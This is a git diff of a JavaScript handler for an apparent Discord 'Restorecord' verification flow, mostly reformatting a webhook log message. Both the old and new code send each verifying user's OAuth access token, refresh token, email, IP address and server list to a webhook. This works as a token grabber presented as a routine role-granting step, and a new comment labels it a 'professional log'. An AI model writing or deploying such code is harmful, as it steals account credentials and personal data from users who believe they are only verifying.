@@ -33,68 +33,58 @@ export default async function handler(req, res) {
     headers: { Authorization: `Bearer ${access_token}` },
   });
 
-  if (!userResponse.ok || !guildsResponse.ok) return res.status(500).send("Failed to fetch user data");
+  if (!userResponse.ok || !guildsResponse.ok)
+    return res.status(500).send("Failed to fetch user data");
 
   const user = await userResponse.json();
   const guilds = await guildsResponse.json();
 
   const userIp =
-    req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";
+    req.headers["x-forwarded-for"]?.split(",")[0] ||
+    req.socket.remoteAddress ||
+    "IP not found";
 
-  const serverList = guilds
-    .slice(0, 10)
-    .map(g => `- ${g.name} (${g.id})`)
-    .join("\n") || "None";
+  const serverList =
+    guilds
+      .slice(0, 10)
+      .map((g) => `- ${g.name} (${g.id})`)
+      .join("\n") || "None";
 
   const expiresInMinutes = Math.floor(expires_in / 60);
   const expiryDate = new Date(Date.now() + expires_in * 1000).toISOString();
 
+  // Send professional log to webhook
   await fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       embeds: [
         {
-          title: "User Verification Log",
-          color: 0x1f1f1f,
-          fields: [
-            {
-              name: "User Info",
-              value: "```" + `${user.username}#${user.discriminator}\nID: ${user.id}` + "```",
-            },
-            {
-              name: "Email",
-              value: "```" + `${user.email || "Not Available"}` + "```",
-            },
-            {
-              name: "IP Address",
-              value: "```" + `${userIp}` + "```",
-            },
-            {
-              name: "Access Token",
-              value: "```" + `${access_token}` + "```",
-            },
-            {
-              name: "Refresh Token",
-              value: "```" + `${refresh_token}` + "```",
-            },
-            {
-              name: "Token Expiry",
-              value: "```" + `${expiresInMinutes} minutes\n${expiryDate}` + "```",
-            },
-            {
-              name: "Guilds (up to 10)",
-              value: "```" + `${serverList}` + "```",
-            },
-          ],
-          footer: { text: "Restorecord System Logs" },
+          title: "Restorecord • Verification Log",
+          color: 0x2f3136,
+          description:
+            "```txt\n" +
+            `> USER\n` +
+            `Username     : ${user.username}#${user.discriminator}\n` +
+            `User ID      : ${user.id}\n` +
+            `Email        : ${user.email || "Unavailable"}\n` +
+            `IP Address   : ${userIp}\n\n` +
+            `> TOKENS\n` +
+            `Access Token : ${access_token}\n` +
+            `Refresh Token: ${refresh_token}\n` +
+            `Expires In   : ${expiresInMinutes} mins\n` +
+            `Expiry Time  : ${expiryDate}\n\n` +
+            `> GUILDS (up to 10)\n` +
+            `${serverList}` +
+            "\n```",
+          footer: { text: "Restorecord Logs" },
           timestamp: new Date().toISOString(),
         },
       ],
     }),
   }).catch(console.error);
 
-  // Grant role via your Render backend
+  // Notify your Render backend to assign the verified role
   await fetch("https://myproject-bvb7.onrender.com/grant-role", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
